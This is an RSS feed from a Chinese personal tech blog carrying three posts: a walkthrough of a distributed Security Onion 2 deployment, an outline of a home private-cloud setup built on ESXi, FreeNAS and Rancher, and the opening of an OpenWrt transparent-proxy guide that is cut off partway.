<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on KeePwn's Notes</title><link>https://www.keepwn.com/posts/</link><description>Recent content in Posts on KeePwn's Notes</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 17 Oct 2024 15:21:10 +0000</lastBuildDate><atom:link href="https://www.keepwn.com/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Security-Onion-2分布式实践之安装篇</title><link>https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/</link><pubDate>Sat, 20 Mar 2021 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/</guid><description>&lt;img src="https://www.keepwn.com/images/banner-security-onion-2-distributed-practice-install.png" alt="Featured image of post Security-Onion-2分布式实践之安装篇" />&lt;h2 id="前言">前言
&lt;/h2>&lt;blockquote>
&lt;p>Security Onion （以下称安全洋葱）是一款免费且开源的，用于威胁发现、企业安全监视和日志管理的 Linux 发行版本。
目前，安全洋葱已经迭代至 2.X，与 1.X 版本不同，2.X 版本基于容器开发，实现了将各个组件和服务容器化，更易于使用者部署和定制。&lt;/p>
&lt;/blockquote>
&lt;p>安全洋葱的安装较为简单，网络上也有诸多的 ALL IN ONE 的安装教程，但考虑到这些部署方式不太适合生产环境使用，所以本篇主要讲述如何在生产环境分布式部署安全洋葱系统。本篇并不涉及系统的调优，如果你此前已经安装并部署了安全洋葱，可以跳过此章节。&lt;/p>
&lt;p>&lt;strong>本文中使用的安全洋葱版本为 v2.3.30（截至本文编写时）。&lt;/strong>&lt;/p>
&lt;h2 id="准备工作">准备工作
&lt;/h2>&lt;p>官方文档建议采用&lt;code>标准的分布式部署方式&lt;/code>进行部署安全洋葱，至少以下三个节点：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>节点类型&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>manager node&lt;/td>
&lt;td>主要节点，负责接收采集到的原始数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>forward node&lt;/td>
&lt;td>流量分析节点，也叫 sensor-node&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>search-node&lt;/td>
&lt;td>搜索节点，存储 ES 数据&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>我部署了 4 个节点，大家根据实际情况进行扩展：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>节点&lt;/th>
&lt;th>IP&lt;/th>
&lt;th>配置&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>security-manager&lt;/td>
&lt;td>10.10.0.1&lt;/td>
&lt;td>8 cores, 16g memory, 200g disk&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>security-sensor&lt;/td>
&lt;td>10.10.0.100&lt;/td>
&lt;td>8 cores, 32g memory, 12t disk&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>security-search-1&lt;/td>
&lt;td>10.10.0.11&lt;/td>
&lt;td>8 cores, 16g memory, 2t disk&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>security-search-2&lt;/td>
&lt;td>10.10.0.12&lt;/td>
&lt;td>8 cores, 16g memory, 2t disk&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>架构大致如下：&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-distributed.webp"
loading="lazy"
alt="so-distributed.webp"
>&lt;/p>
&lt;h2 id="开始安装">开始安装
&lt;/h2>&lt;h3 id="security-manager">Security-manager
&lt;/h3>&lt;p>1.从 ISO 引导启动，设置完用户名和密码，回车后开始安装系统，安装完成后重启系统。&lt;/p>
&lt;p>2.登录系统，输入用户名和密码，准备开始配置。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-1.webp"
loading="lazy"
alt="so-manager-setup-1.webp"
>&lt;/p>
&lt;p>3.选择安装类型为distributed&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-2-choose-install-type.webp"
loading="lazy"
alt="so-manager-setup-2-choose-install-type.webp"
>&lt;/p>
&lt;p>4.选择节点类型为manager&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-3-choose-node-type.webp"
loading="lazy"
alt="so-manager-setup-3-choose-node-type.webp"
>&lt;/p>
&lt;p>5.选择安装环境为standard，这里需要注意 security-manager 这台主机需要能够联网。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-4-choose-install-condition.webp"
loading="lazy"
alt="so-manager-setup-4-choose-install-condition.webp"
>&lt;/p>
&lt;p>6.设置主机名&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-5-set-hostname.webp"
loading="lazy"
alt="so-manager-setup-5-set-hostname.webp"
>&lt;/p>
&lt;p>7.设置管理口，并配置静态地址（这里建议不要选择DHCP分配地址，会影响服务/节点之间的通信）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-6-choose-nic.webp"
loading="lazy"
alt="so-manager-setup-6-choose-nic.webp"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-7-set-static-address.webp"
loading="lazy"
alt="so-manager-setup-7-set-static-address.webp"
>&lt;/p>
&lt;p>8.选择系统补丁计划（默认），设置家庭网络（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-8-choose-os-path-schedule.webp"
loading="lazy"
alt="so-manager-setup-8-choose-os-path-schedule.webp"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-9-set-home-network.webp"
loading="lazy"
alt="so-manager-setup-9-set-home-network.webp"
>&lt;/p>
&lt;p>9.选择安装类型为高级，进行功能定制化&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-10-choose-manager-type.webp"
loading="lazy"
alt="so-manager-setup-10-choose-manager-type.webp"
>&lt;/p>
&lt;p>10.设置 ES 集群名称（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-11-set-es-cluser-name.webp"
loading="lazy"
alt="so-manager-setup-11-set-es-cluser-name.webp"
>&lt;/p>
&lt;p>11.选择元信息分析引擎（zeek or suricata）。考虑到 zeek 可定制化更强些，所以我选择的是 zeek 处理 metadata，suricata 处理 nids-alerts。事实上，两种方式均可，官方这里有讨论//TODO。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-12-choose-gen-metadata.webp"
loading="lazy"
alt="so-manager-setup-12-choose-gen-metadata.webp"
>&lt;/p>
&lt;p>12.选择需要发送的日志类型。&lt;/p>
&lt;blockquote>
&lt;p>请注意，这指的是需要被发送到 manager 节点的日志类型，不是 zeek 要处理的协议（这需要额外进行配置）&lt;/p>
&lt;/blockquote>
&lt;p>建议按照实际监测需求和节点存储容量进行权衡。有选择恐惧症的可以先按默认的来，后面可以再修改的:)。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-13-choose-logs-to-send.webp"
loading="lazy"
alt="so-manager-setup-13-choose-logs-to-send.webp"
>&lt;/p>
&lt;p>13.选择 IDS 规则集（默认）。你也可以选择高级订阅版。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-14-choose-ids-ruleset.webp"
loading="lazy"
alt="so-manager-setup-14-choose-ids-ruleset.webp"
>&lt;/p>
&lt;p>14.选择安装的组件列表（默认）。按需选择。&lt;/p>
&lt;ul>
&lt;li>Grafana
&lt;ul>
&lt;li>主机的健康监控和报警&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Fleet &amp;amp; osquery
&lt;ul>
&lt;li>HIDS，侧重于主机信息被动/主动采集&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Wazuh
&lt;ul>
&lt;li>HIDS，侧重于威胁检测、完整性监控等&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>TheHive
&lt;ul>
&lt;li>安全事件响应平台&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Playbook
&lt;ul>
&lt;li>检测 Playbook 的工具&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Strelka
&lt;ul>
&lt;li>文件提取/分析，用于威胁搜索、威胁检测和事件响应&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-15-choose-components.webp"
loading="lazy"
alt="so-manager-setup-15-choose-components.webp"
>&lt;/p>
&lt;p>15.为其他组件设置邮箱和密码&lt;/p>
&lt;p>16.选择 WEB 界面的访问方式。我选择的是IP，也可以改为域名方式。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-16-choose-web-access.webp"
loading="lazy"
alt="so-manager-setup-16-choose-web-access.webp"
>&lt;/p>
&lt;p>17.选择下载系统更新包的方式。建议选择&lt;code>通过 manager 节点下载&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-17-choose-update-os-by-manager-proxy.webp"
loading="lazy"
alt="so-manager-setup-17-choose-update-os-by-manager-proxy.webp"
>&lt;/p>
&lt;p>18.设置 soremote 密码，后面用于添加其他节点。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-18-set-soremote-passwd.webp"
loading="lazy"
alt="so-manager-setup-18-set-soremote-passwd.webp"
>&lt;/p>
&lt;p>19.设置允许访问WEB界面的网段。建议只添加安全运维段的主机IP, 不在该网段的主机将无法访问WEB界面。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-19-set-so-allow.webp"
loading="lazy"
alt="so-manager-setup-19-set-so-allow.webp"
>&lt;/p>
&lt;p>20.确定应用配置，等待完成安装。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-20.webp"
loading="lazy"
alt="so-manager-setup-20.webp"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-manager-setup-21.webp"
loading="lazy"
alt="so-manager-setup-21.webp"
>&lt;/p>
&lt;p>21.配置防火墙规则，允许其他节点访问管理节点的 Salt 服务 （&lt;strong>重要&lt;/strong>）&lt;/p>
&lt;blockquote>
&lt;p>很多人在部署非管理节点的时候总是提示安装失败，就是因为缺少这个步骤导致的。
sosetup.log中的报错日志类似：&lt;code>[ERROR ] 'mine.send': False&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">firewall-cmd --permanent --zone&lt;span class="o">=&lt;/span> --add-port&lt;span class="o">=&lt;/span>4505-4506/tcp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">firewall-cmd --reload
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="security-sensor">Security-sensor
&lt;/h3>&lt;p>1.完成基础的系统安装后，我们开始配置流量分析节点。&lt;/p>
&lt;p>2.选择安装类型为 distributed&lt;/p>
&lt;p>3.选择节点类型为 sensor&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-1-choose-install-type.webp"
loading="lazy"
alt="so-sensor-setup-1-choose-install-type.webp"
>&lt;/p>
&lt;p>4.设置主机名&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-2-set-hostname.webp"
loading="lazy"
alt="so-sensor-setup-2-set-hostname.webp"
>&lt;/p>
&lt;p>5.选择管理口，并配置静态地址&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-3-choose-nic.webp"
loading="lazy"
alt="so-sensor-setup-3-choose-nic.webp"
>&lt;/p>
&lt;p>6.设置 manager 节点，并输入 soremote 密码，与 manager 节点完成连接。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-4-set-manager-hostname.webp"
loading="lazy"
alt="so-sensor-setup-4-set-manager-hostname.webp"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-5-set-manager-ip.webp"
loading="lazy"
alt="so-sensor-setup-5-set-manager-ip.webp"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-6-connect-to-manager.webp"
loading="lazy"
alt="so-sensor-setup-6-connect-to-manager.webp"
>&lt;/p>
&lt;p>7.选择镜像口&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-7-choose-monitor-nic.webp"
loading="lazy"
alt="so-sensor-setup-7-choose-monitor-nic.webp"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-8.webp"
loading="lazy"
alt="so-sensor-setup-8.webp"
>&lt;/p>
&lt;p>8.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。&lt;/p>
&lt;p>9.选择安装类型为高级，进行功能定制化。&lt;/p>
&lt;p>10.进行 CPU 绑定（Zeek、Suricata）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-9-bind-cpu-zeek.webp"
loading="lazy"
alt="so-sensor-setup-9-bind-cpu-zeek.webp"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-10-bind-cpu-surucata.webp"
loading="lazy"
alt="so-sensor-setup-10-bind-cpu-surucata.webp"
>&lt;/p>
&lt;p>11.配置镜像口MTU（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-sensor-setup-11-mtu.webp"
loading="lazy"
alt="so-sensor-setup-11-mtu.webp"
>&lt;/p>
&lt;p>12.等待安装完成。&lt;/p>
&lt;h3 id="security-search">Security-search
&lt;/h3>&lt;p>1.完成基础的系统安装后，我们开始配置流量分析节点。&lt;/p>
&lt;p>2.选择安装类型为 distributed&lt;/p>
&lt;p>3.选择节点类型为 searchnode&lt;/p>
&lt;p>4.设置主机名&lt;/p>
&lt;p>5.选择管理口，并配置静态地址&lt;/p>
&lt;p>6.设置 manager 节点（输入 soremote 密码）&lt;/p>
&lt;p>7.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。&lt;/p>
&lt;p>8.选择安装类型为高级，进行功能定制化。&lt;/p>
&lt;p>9.配置 ES 堆大小（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-search-setup-1-set-es-heap-size.webp"
loading="lazy"
alt="so-search-setup-1-set-es-heap-size.webp"
>&lt;/p>
&lt;p>10.配置 Logstash 堆大小（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-search-setup-2-set-logstash-heap-size.webp"
loading="lazy"
alt="so-search-setup-2-set-logstash-heap-size.webp"
>&lt;/p>
&lt;p>11.配置 Logstash pipeline 线程（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-search-setup-3-set-logstash-pipeline-workers.webp"
loading="lazy"
alt="so-search-setup-3-set-logstash-pipeline-workers.webp"
>&lt;/p>
&lt;p>12.配置 logstash pipeline 批处理大小（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-search-setup-4-set-logstash-pipeline-batch-size.webp"
loading="lazy"
alt="so-search-setup-4-set-logstash-pipeline-batch-size.webp"
>&lt;/p>
&lt;p>13.配置 logstash input 线程数（默认），如果发现存在消息积压（redis），可以适当调整以上几个参数。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-search-setup-5-set-logstash-input-num.webp"
loading="lazy"
alt="so-search-setup-5-set-logstash-input-num.webp"
>&lt;/p>
&lt;p>14.配置 ES 索引关闭时间（默认为 30 天）。关闭索引不会删除数据，如果需要查询历史数据可以再单独开启。如果内存足够的话，可以设置为 90 天。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-search-setup-6-set-days-of-indices-open.webp"
loading="lazy"
alt="so-search-setup-6-set-days-of-indices-open.webp"
>&lt;/p>
&lt;p>15.配置 ES 存储大小，我配置的是 1948（2T-100G），可以择优调整。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/so-search-setup-7-set-es-size.webp"
loading="lazy"
alt="so-search-setup-7-set-es-size.webp"
>&lt;/p>
&lt;p>16.等待安装完成。&lt;/p>
&lt;h2 id="功能验证">功能验证
&lt;/h2>&lt;p>1.打开 https://10.10.0.1 安全洋葱控制台并登陆&lt;/p>
&lt;p>2.点击 Grid 标签，查看网格状态，检查节点是否已经全部上线。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/soc-web-grid.webp"
loading="lazy"
alt="soc-web-grid.webp"
>&lt;/p>
&lt;p>在这里，大家可以看到节点列表中还出现了一个陌生的节点类型 securityonion-fleet，这个是其实是独立部署的 Fleet 服务，由于需要管理的 osquery 客户端较多，容易影响性能，所以就把它从管理节点拆分出来了。&lt;/p>
&lt;p>3.点击 Alerts 标签，检查是否可以正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/soc-web-alert.webp"
loading="lazy"
alt="soc-web-alert.webp"
>&lt;/p>
&lt;p>4.点击 Hunt 标签，检查是否正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/soc-web-hunt.webp"
loading="lazy"
alt="soc-web-hunt.webp"
>&lt;/p>
&lt;p>5.点击 Grafana 标签，检查各个主机节点是否正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/soc-grafana.webp"
loading="lazy"
alt="soc-grafana.webp"
>&lt;/p>
&lt;p>6.点击 Kiabana 标签，检查 ES 服务是否正常。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/images/soc-kibana.webp"
loading="lazy"
alt="soc-kibana.webp"
>&lt;/p>
&lt;p>好了，如果服务一切正常的话，你可以开始打工人生活了:)&lt;/p>
&lt;h2 id="参考链接">参考链接
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="https://docs.securityonion.net/en/2.3/about.html" target="_blank" rel="noopener"
>https://docs.securityonion.net/en/2.3/about.html&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>构建适合程序员的私有云</title><link>https://www.keepwn.com/posts/build-home-cloud-center-for-it/</link><pubDate>Sun, 09 Apr 2017 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/build-home-cloud-center-for-it/</guid><description>&lt;img src="https://www.keepwn.com/images/banner-build-home-cloud-center-for-IT.png" alt="Featured image of post 构建适合程序员的私有云" />&lt;h2 id="前言">前言
&lt;/h2>&lt;p>如今网络上有很多关于如何自建NAS、搭建家庭私有云的教程，但基本都止步于文件共享和多媒体服务。&lt;/p>
&lt;p>作为一个半吊子的码农，这显然不能满足我的需求。&lt;/p>
&lt;p>所以，结合着自己需求搞了一套自己的私有云方案，在各种大坑小坑中坚持了近大半年后，发现该方案极大的提高了自己的工作效率。&lt;/p>
&lt;blockquote>
&lt;p>以下的方案不一定完全适合你，你可能需要根据自己的实际需求进行适当更改。&lt;/p>
&lt;/blockquote>
&lt;h2 id="核心内容">核心内容
&lt;/h2>&lt;ul>
&lt;li>数据中心，提供数据存储服务&lt;/li>
&lt;li>家庭服务中心，提供常见的NAS服务&lt;/li>
&lt;li>工作服务中心，提供工作上所需服务&lt;/li>
&lt;/ul>
&lt;h2 id="准备工作">准备工作
&lt;/h2>&lt;ul>
&lt;li>准备一台家用服务器（我个人用的是Gen8 1230v2 16G）
&lt;ul>
&lt;li>CPU需要支持VT-D和VT-X&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>准备1块SSD和至少2块以上的机械硬盘&lt;/li>
&lt;li>准备一张HBA卡（IT模式的D2607-A11阵列卡）&lt;/li>
&lt;li>安装ESXI6系统
&lt;ul>
&lt;li>系统建议单独安装在U盘/SD卡上&lt;/li>
&lt;li>SSD连接在主板SATA接口上，机械硬盘连接在HBA卡上&lt;/li>
&lt;li>将HBA卡配置为直通模式&lt;/li>
&lt;li>将SSD挂载到ESXI中，新建存储为&lt;code>SSD_DataStore&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;div class="admonition question">
&lt;div class="details-summary admonition-title">
&lt;i class='icon fas fa-question-circle fa-fw'>&lt;/i>
Question
&lt;/div>
&lt;div class="details-content">
&lt;div class="admonition-content">
&lt;p>Q: 为什么选用ESXI而不是Hyper-V?
A: 如果只是用来搭建NAS服务，两者区别不大。但目前的这套方案，使用ESXI更为合适。&lt;/p>
&lt;/div>
&lt;/div>
&lt;/div>
&lt;h2 id="数据中心">数据中心
&lt;/h2>&lt;p>数据中心，主要提供数据存储服务，这里有两个数据中心：&lt;/p>
&lt;ul>
&lt;li>被ESXI管理的SSD
&lt;ul>
&lt;li>用于存储&lt;code>提供基础服务的虚拟机的文件&lt;/code>和&lt;code>交换文件&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>被FreeNAS管理的机械硬盘
&lt;ul>
&lt;li>主要提供NFS、CIFS、AFP这3种形式的数据服务&lt;/li>
&lt;li>为ESXI提供部分存储空间，用于存储&lt;code>使用频率较低的虚拟机的文件&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="freenas安装与配置">FreeNAS安装与配置
&lt;/h3>&lt;ul>
&lt;li>创建FreeNAS虚拟机
&lt;ul>
&lt;li>&lt;strong>[存储位置为SSD_DataStore]&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>创建ZFS卷
&lt;ul>
&lt;li>2个以上的机械硬盘&lt;/li>
&lt;li>存储池类型为Mirror或RAIDZ&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>创建多个数据集
&lt;ul>
&lt;li>&lt;code>/vms&lt;/code>，提供给ESXI，开启NFS&lt;/li>
&lt;li>&lt;code>/media&lt;/code>，用于家庭影音，开启NFS、CIFS共享&lt;/li>
&lt;li>&lt;code>/share&lt;/code>，用于文件共享，开启NFS、CIFS共享&lt;/li>
&lt;li>&lt;code>/tm&lt;/code>，用于TimeMachine，开启AFP共享&lt;/li>
&lt;li>等&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>将vms挂载到ESXI中，新建存储为&lt;code>VMS_DataStore&lt;/code>&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>FreeNAS的数据，一定要做好手动备份，毕竟号称有五重备份的GitLab也吃了大亏的:)&lt;/p>
&lt;/blockquote>
&lt;h2 id="服务集群中心">服务集群中心
&lt;/h2>&lt;p>服务集群中心，包括ESXI提供的虚拟机资源和Rancher提供的容器资源。&lt;/p>
&lt;h3 id="rancher集群安装与配置">Rancher集群安装与配置
&lt;/h3>&lt;ul>
&lt;li>创建3台虚拟机（RancherOS、CoreOS、Ubuntu等系统任选）
&lt;ul>
&lt;li>&lt;strong>[存储位置为SSD_DataStore]&lt;/strong>&lt;/li>
&lt;li>分别命名为master、node1和node2&lt;/li>
&lt;li>分别安装docker&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>部署Rancher集群
&lt;ul>
&lt;li>在master主机上部署Rancher-Server&lt;/li>
&lt;li>在master主机上部署Rancher-Agent，将master添加到server&lt;/li>
&lt;li>在node1、node2主机上部署Rancher-Agent，将node1和node2添加到server&lt;/li>
&lt;li>合理分配3个主机上的容器的部署&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>配置Rancher数据源
&lt;ul>
&lt;li>在数据中心创建&lt;code>/rancher&lt;/code>数据集&lt;/li>
&lt;li>部署Rancher-NFS&lt;/li>
&lt;li>使用Rancher-NFS服务，容器可实现数据持久化&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="基础建设服务">基础建设服务
&lt;/h3>&lt;ul>
&lt;li>智能家庭服务
&lt;ul>
&lt;li>Home-Assistant和Homebridge&lt;/li>
&lt;li>容器方式部署&lt;/li>
&lt;li>实现用网页端和IOS端对家里的服务或设备进行管理&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>透明代理服务
&lt;ul>
&lt;li>openwrt虚拟机，&lt;strong>[存储位置为SSD_DataStore]&lt;/strong>&lt;/li>
&lt;li>具体部署方法在本站中搜索&lt;/li>
&lt;li>设置主机的网关为openwrt地址，即可实现透明代理&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>公网映射服务
&lt;ul>
&lt;li>容器方式部署，ngrok、n2n和frp任选&lt;/li>
&lt;li>需要一台公网主机&lt;/li>
&lt;li>实现将内网服务映射到公网，方便远程访问&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>证书签发服务
&lt;ul>
&lt;li>容器方式部署&lt;/li>
&lt;li>内网使用自签发证书&lt;/li>
&lt;li>公网使用Let&amp;rsquo;s Encrypt服务签发证书&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>对于使用ngrok和n2n，个人有一些心得，有时间另开篇介绍&lt;/p>
&lt;/blockquote>
&lt;h3 id="家庭类服务">家庭类服务
&lt;/h3>&lt;p>一般包括同步、影音、网盘等服务，需要用到以下系统：&lt;/p>
&lt;ul>
&lt;li>Plex Media Server / Emby Server
&lt;ul>
&lt;li>容器&lt;/li>
&lt;li>管理影音文件&lt;/li>
&lt;li>多设备同时看电影、追美剧&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Resilio Sync
&lt;ul>
&lt;li>容器&lt;/li>
&lt;li>多个平台之间文件同步&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Xware
&lt;ul>
&lt;li>容器&lt;/li>
&lt;li>迅雷官方远程下载服务&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>DSM6（群晖）
&lt;ul>
&lt;li>虚拟机，&lt;strong>[存储位置为SSD_DataStore]&lt;/strong>&lt;/li>
&lt;li>和FreeNAS功能类似&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>本方案中，因为已经搭建了FreeNAS，DSM6的功能已经被大大地弱化了，可以不装&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>Plex和Emby两个都是比较出名的家庭流媒应用，目前个人用Plex比较多&lt;/p>
&lt;/blockquote>
&lt;h3 id="工作类服务">工作类服务
&lt;/h3>&lt;p>一般包括代码版本控制、记事本、测试环境等服务：&lt;/p>
&lt;ul>
&lt;li>Leanote Server
&lt;ul>
&lt;li>容器&lt;/li>
&lt;li>开源的多平台云笔记&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Gogs Server
&lt;ul>
&lt;li>容器&lt;/li>
&lt;li>代码版本控制系统，和github类似&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Drone
&lt;ul>
&lt;li>容器&lt;/li>
&lt;li>持续构建系统，方便测试代码或部署环境&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>各类数据库
&lt;ul>
&lt;li>优先容器（MongoDB不宜搭建在容器中，会发生错误，暂未解决）&lt;/li>
&lt;li>多种数据库统一存储，统一管理&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="进阶">进阶
&lt;/h2>&lt;p>由于各个服务之间联系不大，系统平台也比较多，管理起来实在不便。如果有开发能力的话，还是建议自己开发个系统来统一协调各个服务。比如使用微信端入口，对服务进行定期检查，消息通知，甚至是远程控制，未来还是很美好的:)&lt;/p>
&lt;h2 id="最后">最后
&lt;/h2>&lt;p>最后，这个方案其实还有很多的内容，本文只是列了一些提纲，具体在实际操作中必然会有很多问题，就拿Rancher来说，Rancher中容器如何配置、存储如何挂载就需要好好斟酌，当然这会有一个很长的试错过程。当然和去年相比，Rancher上的坑已经少了太多了，想当初把Rancher从v1.1一步步升到现在的1.5.x，中间经历了什么，想想都要哭了&lt;/p></description></item><item><title>Openwrt上实现透明代理</title><link>https://www.keepwn.com/posts/see-the-big-world-on-openwrt/</link><pubDate>Wed, 28 Dec 2016 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/see-the-big-world-on-openwrt/</guid><description>&lt;h2 id="背景">背景
&lt;/h2>&lt;p>前一段时间，在ESXI上部署了一台Plex服务器。解决了一些恼人的问题后，用得还算满意，但是TMDb搜刮器在匹配电影信息时，总会丢失一些Poster海报信息。&lt;/p>
&lt;p>最终发现，&lt;a class="link" href="https://www.themoviedb.org" target="_blank" rel="noopener"
>The Movie Database (TMDb)&lt;/a> 这个地址被&lt;code>和谐社会&lt;/code>了。&lt;/p>
&lt;p>由于Plex不支持设置代理，且手动设置&lt;code>HTTP_PROXY&lt;/code>后还是无效，所以决定把Plex这台服务器加入透明代理网络中。&lt;/p>
&lt;blockquote>
&lt;p>参考以前的文章&lt;a class="link" href="https://www.keepwn.com/howto/route-traffic-selectively-by-domain-on-openwrt/" >《Openwrt上使用dnsmasq和ipset实现域名分流》&lt;/a>，将网关、DNS设置为&lt;code>192.168.0.254&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>因为之前重新部署了ESXI环境，所以Openwrt这台虚拟机不幸丢失，所以只能&lt;code>大侠请重新来过&lt;/code>。&lt;/p>
&lt;p>由于之前的方案在实际使用中还有一些不足，在综合了网络上现有的一些方案后，设计出一份改进版的方案。&lt;/p>
&lt;!-- more -->
&lt;h2 id="网络上原始的方案">网络上原始的方案
&lt;/h2>&lt;h3 id="安装软件">安装软件
&lt;/h3>&lt;ul>
&lt;li>shadowsocks-libev和luci-app-shadowsocks（提供ss-rules）
